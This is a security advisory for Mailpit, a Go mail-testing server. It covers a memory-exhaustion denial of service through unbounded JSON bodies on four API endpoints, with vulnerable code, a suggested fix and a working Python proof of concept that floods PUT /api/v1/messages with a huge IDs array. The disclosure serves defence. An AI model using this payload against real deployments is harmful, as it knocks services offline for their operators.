# [M] Mailpit: Sibling-endpoint memory-exhaustion DoS via unbounded JSON body on /api/v1/messages, /api/v1/tags, and /api/v1/message/{id}/release (incomplete fix of GHSA-fpxj-m5q8-fphw)

## Summary
Severity: Medium
Advisory: GHSA-28pq-6qxg-wg5r
CVE: CVE-2026-48824
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-28pq-6qxg-wg5r
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=0 <1.30.1

## Details
### Summary

The fix for GHSA-fpxj-m5q8-fphw (CVE-2026-45710, "Mailpit: Set a default 50MB p/m limit to prevent DoS via unlimited SMTP DATA and /api/v1/send body sizes") wrapped only `POST /api/v1/send` with `http.MaxBytesReader`. The four other Mailpit JSON-body API endpoints  `PUT /api/v1/messages` (SetReadStatus), `DELETE /api/v1/messages` (DeleteMessages), `PUT /api/v1/tags` (SetMessageTags), and `POST /api/v1/message/{id}/release` (ReleaseMessage)  still call `json.NewDecoder(r.Body)` directly with no body-size cap and remain reachable unauthenticated in the default `docker run axllent/mailpit:latest` deploy. An unauthenticated remote attacker can post a multi-million-element `IDs` slice and drive RSS from ~25 MiB baseline to ~450 MiB per 16 MB request body. Repeating across multiple connections accumulates the same per-request amplification per process.

### Affected versions

- Mailpit at HEAD `67a7ca83ff759082d2b86dda07eb5bb3dad404e0` (v1.30.0, 2026-05-14).
- All versions `<= v1.30.0` (the release that shipped the GHSA-fpxj fix). Versions `< v1.30.0` are vulnerable to the original GHSA-fpxj on `/api/v1/send`; version `v1.30.0` carries the sibling-endpoint gap described here.

### Privilege required

None in default deploy (no `--ui-auth`, no `--smtp-auth`). The four endpoints share the same `middleWareFunc` wrapper as the original GHSA-fpxj target, so the same default-no-auth threat model applies. With `--ui-auth=user:pass` configured, the same primitive is post-auth — still useful since UI-auth Mailpit deployments commonly run on internal ops subnets where one stolen UI credential pivots into an RSS-exhaustion vector against the same host.

### The incomplete fix

Commit `136bdde` ("Security: Set a default 50MB p/m limit to prevent DoS via unlimited SMTP DATA and /api/v1/send body sizes (GHSA-fpxj-m5q8-fphw)", 2026-05-12) added the `MaxBytesReader` wrap in exactly one place:

```go
// server/apiv1/send.go:45-48
if config.MaxMessageSize > 0 {
    r.Body = http.MaxBytesReader(w, r.Body, int64(config.MaxMessageSize)*1024*1024)
}

decoder := json.NewDecoder(r.Body)
```

The sibling JSON-body handlers were not updated. Side-by-side at HEAD `67a7ca8`:

| File | Function | `MaxBytesReader`? | Unauth in default deploy? |
|---|---|---|---|
| `server/apiv1/send.go:45-48` (`SendMessageHandler`) | POST `/api/v1/send` | YES (50 MB) | YES (via `sendAPIAuthMiddleware` falling back to `middleWareFunc`) |
| `server/apiv1/messages.go:107` (`SetReadStatus`) | PUT `/api/v1/messages` | NO | YES |
| `server/apiv1/messages.go:187` (`DeleteMessages`) | DELETE `/api/v1/messages` | NO | YES |
| `server/apiv1/tags.go:54` (`SetMessageTags`) | PUT `/api/v1/tags` | NO | YES |
| `server/apiv1/release.go:55` (`ReleaseMessage`) | POST `/api/v1/message/{id}/release` | NO | YES |

The four sibling handlers all share the shape:

```go
// server/apiv1/messages.go:107-115 (SetReadStatus)
decoder := json.NewDecoder(r.Body)

var data struct {
    Read   bool
    IDs    []string
    Search string
}

err := decoder.Decode(&data)
```

No `MaxBytesReader`, no body-size cap, no `r.Header.Get("Content-Length")` check. The `json.NewDecoder` streams the body but each `"x"` element materialises as a separate Go `string` plus slice-header overhead, so the unmarshalled `[]string` slice for `IDs` grows roughly linearly with attacker payload size.

### Vulnerable code

`server/apiv1/messages.go:107`:

```go
func SetReadStatus(w http.ResponseWriter, r *http.Request) {
    decoder := json.NewDecoder(r.Body)

    var data struct {
        Read   bool
        IDs    []string
        Search string
    }

    err := decoder.Decode(&data)
    if err != nil {
        httpError(w, err.Error())
        return
    }
    // ...
```

Three other handlers (`DeleteMessages`, `SetMessageTags`, `ReleaseMessage`) match the same shape.

### Reachability chain (default deploy)

```
Listen()                                  # config/config.go HTTPListen = "[::]:8025"
   ↓
HTTP server                               # server/server.go:177-186
   ↓
middleWareFunc(apiv1.SetReadStatus)       # server/server.go:178 — auth bypassed when UICredentials == nil
   ↓
SetReadStatus                             # server/apiv1/messages.go:87
   ↓
json.NewDecoder(r.Body).Decode(&data)    # no MaxBytesReader; allocates 4M Go strings + slice for {"IDs":["x",...]}
   ↓
RSS grows ~28x relative to payload size
```

`config/config.go`'s `MaxMessageSize` field (added by 136bdde) exists and is parsed from `--max-message-size` (default 50 MB), but it is checked only in `server/apiv1/send.go`. The four sibling handlers never consult it.

### Reproduction (E2E against `axllent/mailpit:latest` v1.30.0)

```bash
# 1) start mailpit with defaults (no --ui-auth, no --smtp-auth)
docker run --name mailpit-test -d -p 18025:8025 axllent/mailpit:latest

# 2) baseline RSS
docker stats mailpit-test --no-stream --format '{{.MemUsage}}'
# → 8.473MiB / 5.772GiB

# 3) trigger
python3 - <<'PY'
import socket
N = 4_000_000
prefix = b'{"Read": true, "IDs": ['
items  = b'"x"' + (b',"x"' * (N - 1))
suffix = b']}'
clen   = len(prefix) + len(items) + len(suffix)
s = socket.create_connection(("localhost", 18025), timeout=300)
s.sendall(
    b"PUT /api/v1/messages HTTP/1.1\r\n"
    b"Host: localhost:18025\r\n"
    b"Content-Type: application/json\r\n"
    b"Content-Length: " + str(clen).encode() + b"\r\n"
    b"Connection: close\r\n\r\n")
s.sendall(prefix)
rem = items
while rem:
    s.sendall(rem[:1024*1024]); rem = rem[1024*1024:]
s.sendall(suffix)
s.close()
PY

# 4) post-PoC RSS
docker stats mailpit-test --no-stream --format '{{.MemUsage}}'
# → 455.8MiB / 5.772GiB
```

Observed: a single 16 MB JSON body drove Mailpit RSS from 8.473 MiB to 455.8 MiB (+447 MiB, ~28× amplification). Memory is not freed between requests; repeating the PoC over multiple TCP connections sums per-process until the operator restarts the container or the host memory pressure regime terminates it.

The same primitive reproduces on `DELETE /api/v1/messages`, `PUT /api/v1/tags`, and `POST /api/v1/message/{any-id}/release` with identical body shapes; each of the four endpoints individually reproduces the same amplification.

### Impact

- **Pre-auth remote memory-exhaustion DoS.** Default-deploy Mailpit (the deployment shape the README documents for dev/CI use) is reachable unauthenticated on `[::]:8025`. A single TCP connection sending one ~100 MB JSON `IDs` body drives RSS to ~2.8 GB. Multiple concurrent connections compound the per-process RSS growth. Class-and-severity match the parent CVE-2026-45710.
- **Disk amplification (secondary).** The `IDs` slice itself is not persisted to SQLite (unlike the parent GHSA-fpxj message-body path), so disk pressure is limited to whatever the handler does downstream. For `SetReadStatus`, the slice is iterated and an UPDATE is issued for each id; with 4M entries the per-call work is also linear in `len(ids)`.
- **Same threat model as the parent.** The maintainer chose 50 MB as the default cap for `/api/v1/send` to bound the worst case there. Without the same cap on these sibling endpoints, the per-process worst-case is unbounded.

### Suggested fix

Apply the same `MaxBytesReader` pattern already proven on `send.go` to every JSON-body handler. Concretely, wrap each of the four sibling sites:

```go
// server/apiv1/messages.go:107  (SetReadStatus)
if config.MaxMessageSize > 0 {
    r.Body = http.MaxBytesReader(w, r.Body, int64(config.MaxMessageSize)*1024*1024)
}
decoder := json.NewDecoder(r.Body)

// server/apiv1/messages.go:187  (DeleteMessages) — same wrap
// server/apiv1/tags.go:54       (SetMessageTags) — same wrap
// server/apiv1/release.go:55    (ReleaseMessage)  — same wrap
```

A cleaner shape is to factor the cap into the existing `middleWareFunc` wrapper in `server/server.go`, so every API handler that is not an upload-style endpoint inherits the cap by default. 

### Credit

Reported by tonghuaroot.

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-28pq-6qxg-wg5r
- https://github.com/axllent/mailpit
